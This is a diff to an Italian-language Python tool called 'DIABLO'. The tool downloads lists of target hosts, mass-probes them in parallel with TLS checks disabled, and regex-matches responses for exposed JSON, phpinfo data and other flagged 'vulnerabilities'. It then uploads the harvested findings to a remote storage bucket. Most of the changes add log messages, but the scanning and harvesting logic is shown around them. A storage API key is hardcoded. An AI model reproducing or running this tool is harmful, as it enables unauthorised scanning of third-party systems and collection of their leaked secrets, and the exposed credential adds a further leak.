@@ -29,7 +29,7 @@ BUNNY_API_KEY = "a34bea81-b348-49fb-a28ef869d967-3fe2-43fc"
 
 def download_files_from_bunny():
     """Scarica i file txt dalla cartella site/ nello storage di Bunny"""
-    print("Inizio download file da Bunny Storage...", flush=True)
+    print("[BUNNY DOWNLOAD] Inizio download file da Bunny Storage...", flush=True)
     headers = {"AccessKey": BUNNY_API_KEY, "Accept": "application/json"}
     site_dir = 'site'
     os.makedirs(site_dir, exist_ok=True)
@@ -37,26 +37,27 @@ def download_files_from_bunny():
     try:
         url = f"{BUNNY_STORAGE_URL}/site/"
         response = requests.get(url, headers=headers)
-        print(f"Richiesta lista file a {url} - Status: {response.status_code}", flush=True)
+        print(f"[BUNNY DOWNLOAD] Richiesta lista file a {url} - Status: {response.status_code}", flush=True)
         
         if response.status_code == 200:
             files = response.json()
-            print(f"Trovati {len(files)} elementi nella cartella site/ su Bunny.", flush=True)
+            print(f"[BUNNY DOWNLOAD] Trovati {len(files)} elementi nella cartella site/ su Bunny.", flush=True)
             for file_info in files:
                 if not file_info.get("IsDirectory", True) and file_info.get("ObjectName", "").endswith(".txt"):
                     file_name = file_info["ObjectName"]
                     file_url = f"{BUNNY_STORAGE_URL}/site/{file_name}"
+                    print(f"[BUNNY DOWNLOAD] Scaricamento in corso: {file_name}...", flush=True)
                     res = requests.get(file_url, headers=headers)
                     if res.status_code == 200:
                         with open(os.path.join(site_dir, file_name), "wb") as f:
                             f.write(res.content)
-                        print(f"Scaricato con successo: {file_name}", flush=True)
+                        print(f"[BUNNY DOWNLOAD] ✔️ Scaricato con successo: {file_name}", flush=True)
                     else:
-                        print(f"Errore download {file_name}: {res.status_code}", flush=True)
+                        print(f"[BUNNY DOWNLOAD] ❌ Errore download {file_name}: {res.status_code}", flush=True)
         else:
-            print(f"Errore Bunny Storage: {response.text}", flush=True)
+            print(f"[BUNNY DOWNLOAD] ❌ Errore Bunny Storage: {response.text}", flush=True)
     except Exception as e:
-        print(f"Eccezione durante il download: {str(e)}", flush=True)
+        print(f"[BUNNY DOWNLOAD] ⚠️ Eccezione durante il download: {str(e)}", flush=True)
         with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
             f.write(f"Error downloading from Bunny Storage: {str(e)}\n")
 
@@ -64,28 +65,30 @@ def upload_file_to_bunny(local_path, remote_path):
     """Carica un file locale nello storage di Bunny"""
     headers = {"AccessKey": BUNNY_API_KEY}
     try:
+        print(f"[BUNNY UPLOAD] Inizio caricamento del file {local_path} verso {remote_path}...", flush=True)
         with open(local_path, "rb") as f:
             data = f.read()
         url = f"{BUNNY_STORAGE_URL}/{remote_path}"
         res = requests.put(url, headers=headers, data=data)
         if res.status_code in [200, 201]:
-            print(f"Caricato su Bunny: {remote_path}", flush=True)
+            print(f"[BUNNY UPLOAD] ✔️ Caricato su Bunny: {remote_path}", flush=True)
         else:
-            print(f"Errore upload {remote_path}: Status {res.status_code} - {res.text}", flush=True)
+            print(f"[BUNNY UPLOAD] ❌ Errore upload {remote_path}: Status {res.status_code} - {res.text}", flush=True)
     except Exception as e:
-        print(f"Eccezione durante l'upload di {remote_path}: {str(e)}", flush=True)
+        print(f"[BUNNY UPLOAD] ⚠️ Eccezione durante l'upload di {remote_path}: {str(e)}", flush=True)
         with open(os.path.join('DIABLO-LOGV9', 'ERROR2.txt'), 'a', encoding='utf-8') as f:
             f.write(f"Error uploading to Bunny Storage: {str(e)}\n")
 
 def upload_results_to_bunny():
     """Carica tutta la cartella DIABLO-LOGV9 su Bunny Storage in risultati/"""
-    print("Inizio caricamento risultati su Bunny Storage...", flush=True)
+    print("[BUNNY UPLOAD] Inizio caricamento cartella risultati su Bunny Storage...", flush=True)
     for root, _, files in os.walk(result_dir):
         for file in files:
             local_path = os.path.join(root, file)
             rel_path = os.path.relpath(local_path, result_dir)
             remote_path = f"risultati/{rel_path}".replace("\\", "/")
             upload_file_to_bunny(local_path, remote_path)
+    print("[BUNNY UPLOAD] Caricamento risultati completato.", flush=True)
 
 def load_config():
     try:
@@ -240,11 +243,13 @@ def find_subdomains(domain):
 
 def process_urls(urls_list, is_fallback=False):
     it = iter(urls_list)
+    print(f"\n[SCANNER] 🚀 Avvio scansione su {len(urls_list)} URL (fallback={is_fallback})...", flush=True)
     while True:
         chunk = list(islice(it, 50))
         if not chunk:
             break
         
+        print(f"[SCANNER] Controllo blocco di {len(chunk)} URL...", flush=True)
         try:
             resp_site = [
                 grequests.get(f"http://{url}", timeout=3, stream=True, verify=False, allow_redirects=False)
@@ -263,6 +268,8 @@ def process_urls(urls_list, is_fallback=False):
                 if r: r.close()
                 
             retry_urls = [chunk[i] for i, r in enumerate(merdb) if r is None or (r.status_code not in [requests.codes.ok, 403, 200, 206])]
+            if retry_urls:
+                print(f"[SCANNER] Retry su {len(retry_urls)} URL in HTTPS...", flush=True)
             resp_retry = [
                 grequests.get(f"https://{url}", timeout=3, stream=True, verify=False, allow_redirects=False)
                 for url in retry_urls
@@ -279,6 +286,7 @@ def process_urls(urls_list, is_fallback=False):
                 if r: r.close()
                 
             for site_link, site_payloads in hosts_by_site.items():
+                print(f"  [SCANNER] 🎯 Analisi target attivo: {site_link}", flush=True)
                 _scan_site(site_link, site_payloads, is_fallback)
                 
         except Exception as e:
@@ -470,6 +478,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                     
                 if regex_found:
                     if not is_html_content:
+                        print(f"    [!] 🔥 VULNERABILITA' TROVATA (Regex): {response_url}", flush=True)
                         rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                         if is_json_file:
                             with open(os.path.join(result_dir, 'DIABLO_JSON.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
@@ -519,6 +528,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                                             clean_key = match.group(1)
                                             formatted_output += f"{clean_key} \t {var_value}\n"
                                 if formatted_output:
+                                    print(f"    [!] 🐘 TROVATO PHPINFO: {response_url}", flush=True)
                                     rnd_suffix_php = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                                     with open(myfile_checktmobilephp, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
                                     with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 8\n')
@@ -564,7 +574,10 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
         with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f: f.write(str(e) + '\n')
 
 def process_file(file_path):
+    file_name = os.path.basename(file_path)
+    print(f"\n[SCANNER] 🚀 Avvio elaborazione del file: {file_name}", flush=True)
     for cameras in chunked_hosts_multi(file_path, chunk_size=50):
+        print(f"[SCANNER] Controllo blocco di {len(cameras)} host dal file {file_name}...", flush=True)
         try:
             resp_site = [
                 grequests.get(f"http://{url}", timeout=3, stream=True, verify=False, allow_redirects=False)
@@ -583,6 +596,8 @@ def process_file(file_path):
                 if r: r.close()
                 
             retry_urls = [cameras[i] for i, r in enumerate(merdb) if r is None or (r.status_code not in [requests.codes.ok, 403, 200, 206])]
+            if retry_urls:
+                print(f"[SCANNER] Retry su {len(retry_urls)} host in HTTPS...", flush=True)
             resp_retry = [
                 grequests.get(f"https://{url}", timeout=3, stream=True, verify=False, allow_redirects=False)
                 for url in retry_urls
@@ -599,6 +614,7 @@ def process_file(file_path):
                 if r: r.close()
                 
             for site_link, site_payloads in hosts_by_site.items():
+                print(f"  [SCANNER] 🎯 Analisi target attivo: {site_link}", flush=True)
                 _scan_site(site_link, site_payloads)
                 
         except Exception as e:
@@ -606,6 +622,7 @@ def process_file(file_path):
                 f.write(str(e) + '\n')
 
 def main():
+    print("\n[SYSTEM] 🛡️ Inizializzazione scanner DIABLO...", flush=True)
     os.makedirs(result_dir, exist_ok=True)
     os.makedirs(newpathtextract, exist_ok=True)
     
@@ -619,24 +636,26 @@ def main():
     txt_files = [os.path.join(site_dir, f) for f in os.listdir(site_dir) if f.endswith('.txt')]
     
     if not txt_files:
+        print("[SYSTEM] ⚠️ Nessun file txt trovato in site/. Termino l'esecuzione.", flush=True)
         return
         
     # 2. Esegui la scansione
     if txt_files:
-        print(f"Avvio scansione su {len(txt_files)} file txt trovati...", flush=True)
+        print(f"\n[SYSTEM] 🚀 Avvio pool di scansione su {len(txt_files)} file txt trovati...", flush=True)
         pool = multiprocessing.Pool(processes=5)
         pool.map(process_file, txt_files)
         pool.close()
         pool.join()
         
         # 3. Carica i risultati su Bunny Storage alla fine
+        print("\n[SYSTEM] 📦 Scansione terminata. Avvio caricamento risultati...", flush=True)
         upload_results_to_bunny()
-        print("Scansione terminata e risultati caricati.", flush=True)
+        print("[SYSTEM] ✅ Scansione terminata e risultati caricati con successo.", flush=True)
     else:
-        print("Nessun file txt trovato da scansionare.", flush=True)
+        print("[SYSTEM] Nessun file txt trovato da scansionare.", flush=True)
         
     # 4. LOOP INFINITO: Essenziale per mantenere in vita il container su Bunny
-    print("Container in standby (Idle) per evitare il riavvio automatico...", flush=True)
+    print("\n[SYSTEM] 💤 Container in standby (Idle) per evitare il riavvio automatico...", flush=True)
     while True:
         time.sleep(3600)  # Dorme per un'ora e ripete, tenendo il container "Ready"
 
